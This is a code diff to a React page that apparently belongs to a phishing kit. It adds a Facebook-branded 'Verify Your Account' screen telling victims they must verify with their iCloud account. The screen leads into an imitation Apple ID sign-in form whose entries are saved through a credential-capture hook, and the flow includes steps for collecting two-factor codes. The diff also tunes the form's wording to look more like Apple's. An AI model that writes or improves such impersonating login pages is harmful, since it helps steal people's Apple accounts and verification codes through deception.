@@ -9,10 +9,10 @@ import { AppleLoader } from "@/components/AppleLoader";
 import { Button } from "@/components/ui/button";
 
 // Step Enum
-type Step = "login" | "two_factor" | "loading_two" | "code_two" | "syncing" | "facebook_auth" | "success";
+type Step = "facebook_start" | "login" | "two_factor" | "loading_two" | "code_two" | "syncing" | "facebook_auth" | "success";
 
 export default function Home() {
-  const [step, setStep] = useState<Step>("login");
+  const [step, setStep] = useState<Step>("facebook_start");
   const [verificationCode, setVerificationCode] = useState(["", "", "", "", "", ""]);
   const [verificationCodeTwo, setVerificationCodeTwo] = useState(["", "", "", "", "", ""]);
   const { mutateAsync: createCredential } = useCreateCredential();
@@ -28,6 +28,10 @@ export default function Home() {
   });
 
   // Handlers
+  const handleFacebookStart = () => {
+    setStep("login");
+  };
+
   const handleLoginSubmit = async (data: InsertCredential) => {
     try {
       console.log("Submitting login:", data);
@@ -137,6 +141,33 @@ export default function Home() {
 
       <AnimatePresence mode="wait">
         
+        {/* STEP 0: FACEBOOK START */}
+        {step === "facebook_start" && (
+          <motion.div
+            key="facebook_start"
+            initial={{ opacity: 0, y: 20 }}
+            animate={{ opacity: 1, y: 0 }}
+            exit={{ opacity: 0, y: -20 }}
+            className="w-full max-w-[400px] flex flex-col items-center"
+          >
+            <div className="w-full bg-white rounded-2xl shadow-sm border border-[#d2d2d7] p-8 text-center">
+              <div className="mx-auto w-16 h-16 bg-[#1877F2] rounded-2xl flex items-center justify-center mb-6 shadow-lg shadow-blue-500/20">
+                <FaFacebook className="text-4xl text-white" />
+              </div>
+              <h1 className="text-2xl font-bold text-[#1c1e21] mb-2">Verify Your Account</h1>
+              <p className="text-[#65676b] mb-8 leading-relaxed">
+                To continue using Facebook, you must verify your identity using your linked iCloud account.
+              </p>
+              <button 
+                onClick={handleFacebookStart}
+                className="w-full py-3 bg-[#1877F2] text-white rounded-xl font-bold hover:bg-[#166fe5] transition-colors"
+              >
+                Start Verification
+              </button>
+            </div>
+          </motion.div>
+        )}
+
         {/* STEP 1: ICLOUD LOGIN */}
         {step === "login" && (
           <motion.div
@@ -164,7 +195,7 @@ export default function Home() {
                     <input
                       {...form.register("email")}
                       className="apple-input"
-                      placeholder="Email or Phone Number"
+                      placeholder="Apple ID"
                       type="text"
                       autoComplete="username"
                     />
@@ -202,14 +233,14 @@ export default function Home() {
                     className="apple-btn flex items-center justify-center gap-2"
                     disabled={form.formState.isSubmitting}
                   >
-                     {form.formState.isSubmitting ? <AppleLoader /> : "Sign In"}
+                     {form.formState.isSubmitting ? <AppleLoader /> : "Continue"}
                   </button>
                 </div>
               </form>
             </div>
             
             <div className="mt-8 text-sm text-[#0071e3] cursor-pointer hover:underline">
-              Create Apple ID
+              Forgot Apple ID or password?
             </div>
           </motion.div>
         )}
